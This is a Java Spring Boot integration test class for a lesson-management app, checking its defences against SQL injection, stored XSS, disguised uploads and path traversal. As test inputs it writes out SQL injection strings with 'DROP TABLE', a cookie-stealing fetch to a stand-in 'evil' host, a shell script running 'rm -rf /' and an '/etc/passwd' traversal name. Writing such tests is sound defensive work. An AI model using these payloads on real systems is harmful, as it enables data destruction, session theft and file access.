package br.com.harmonia.security;

import br.com.harmonia.TestcontainersConfiguration;
import br.com.harmonia.security.SecurityFixture.Pair;
import com.jayway.jsonpath.JsonPath;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.context.annotation.Import;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.web.servlet.MockMvc;
import tools.jackson.databind.ObjectMapper;

import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.hamcrest.Matchers.hasItem;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@DisplayName("Segurança — injeção (SQL, XSS, arquivo malicioso)")
@SpringBootTest
@AutoConfigureMockMvc
@Import(TestcontainersConfiguration.class)
class InjectionSecurityIT {
    @Autowired MockMvc mvc;
    @Autowired JdbcTemplate jdbc;
    @Autowired ObjectMapper json;

    private SecurityFixture fx;
    private Pair pair;

    @BeforeEach
    void setUp() throws Exception {
        fx = new SecurityFixture(mvc);
        pair = fx.pair();
    }

    @ParameterizedTest(name = "login = {0}")
    @ValueSource(strings = {"admin' OR '1'='1", "admin'--", "' OR 1=1 --", "admin' /*", "\" OR \"\"=\""})
    @DisplayName("SQL injection no login não autentica")
    void sqlInjectionInLoginDoesNotAuthenticate(String payload) throws Exception {
        mvc.perform(post("/auth/login").contentType("application/json")
                .content(json.writeValueAsString(Map.of("login", payload, "password", "' OR '1'='1"))))
            .andExpect(status().isUnauthorized())
            .andExpect(jsonPath("$.accessToken").doesNotExist());
    }

    @Test
    @DisplayName("SQL injection em id da URL e em filtro de query string vira 400, não erro de banco")
    void sqlInjectionInPathAndQueryIsRejectedAsBadRequest() throws Exception {
        String token = pair.student().token();
        mvc.perform(get("/me/lessons/{id}", "1' OR '1'='1").header("Authorization", "Bearer " + token))
            .andExpect(status().isBadRequest());
        mvc.perform(get("/me/goals").param("status", "ACTIVE' OR 1=1--").header("Authorization", "Bearer " + token))
            .andExpect(status().isBadRequest());
        mvc.perform(get("/teacher/reports/attendance").param("from", "2026-01-01'; DROP TABLE lesson;--")
                .header("Authorization", "Bearer " + pair.teacher().token()))
            .andExpect(status().isBadRequest());
        assertThat(jdbc.queryForObject("SELECT count(*) FROM lesson", Integer.class)).isPositive();
    }

    @Test
    @DisplayName("payload SQL gravado como dado é salvo literalmente e não executa")
    void storedSqlPayloadIsTreatedAsPlainText() throws Exception {
        String name = "x'); DROP TABLE auth_user; -- " + UUID.randomUUID();
        fx.postId(fx.admin, "/admin/instruments", json.writeValueAsString(Map.of("name", name)));

        mvc.perform(get("/admin/instruments").header("Authorization", "Bearer " + fx.admin))
            .andExpect(status().isOk()).andExpect(jsonPath("$[*].name", hasItem(name)));
        assertThat(jdbc.queryForObject("SELECT count(*) FROM auth_user", Integer.class)).isPositive();
        fx.login("admin", "Admin@123");
    }

    @Test
    @DisplayName("XSS: script gravado volta como texto JSON com nosniff, sem virar HTML")
    void storedXssIsReturnedAsJsonText() throws Exception {
        String script = "<script>alert('xss')</script><img src=x onerror=alert(1)>";
        mvc.perform(put("/teacher/lessons/" + pair.lessonId()).header("Authorization", "Bearer " + pair.teacher().token())
                .contentType("application/json").content(SecurityFixture.lessonEdit(script)))
            .andExpect(status().isOk());

        mvc.perform(get("/me/lessons/" + pair.lessonId()).header("Authorization", "Bearer " + pair.student().token()))
            .andExpect(status().isOk())
            .andExpect(content().contentTypeCompatibleWith("application/json"))
            .andExpect(header().string("X-Content-Type-Options", "nosniff"))
            .andExpect(jsonPath("$.lesson.content").value(script));
    }

    @Test
    @DisplayName("arquivo HTML/script disfarçado de PDF é recusado pela assinatura (magic bytes)")
    void disguisedExecutableUploadIsRejected() throws Exception {
        List<MockMultipartFile> files = List.of(
            new MockMultipartFile("file", "partitura.pdf", "application/pdf",
                "<html><script>fetch('//evil/'+document.cookie)</script></html>".getBytes(StandardCharsets.UTF_8)),
            new MockMultipartFile("file", "shell.sh", "application/pdf",
                "#!/bin/sh\nrm -rf /".getBytes(StandardCharsets.UTF_8)));
        for (MockMultipartFile file : files) {
            mvc.perform(multipart("/teacher/lessons/" + pair.lessonId() + "/attachments").file(file)
                    .header("Authorization", "Bearer " + pair.teacher().token()))
                .andExpect(status().is4xxClientError());
        }
    }

    @Test
    @DisplayName("path traversal no nome do arquivo não escapa da pasta de storage")
    void pathTraversalInFileNameStaysInsideStorage() throws Exception {
        var file = new MockMultipartFile("file", "../../../../etc/passwd.pdf", "application/pdf",
            "%PDF-1.7\nscore".getBytes(StandardCharsets.US_ASCII));
        String body = mvc.perform(multipart("/teacher/lessons/" + pair.lessonId() + "/attachments").file(file)
                .header("Authorization", "Bearer " + pair.teacher().token()))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.storagePath").doesNotExist())
            .andReturn().getResponse().getContentAsString();

        String storagePath = jdbc.queryForObject("SELECT storage_path FROM lesson_attachment WHERE id = ?",
            String.class, UUID.fromString(JsonPath.read(body, "$.id")));
        Path root = Path.of("storage").toAbsolutePath().normalize();
        assertThat(storagePath).doesNotContain("/").doesNotContain("\\");
        assertThat(root.resolve(storagePath).normalize()).startsWith(root);
    }
}
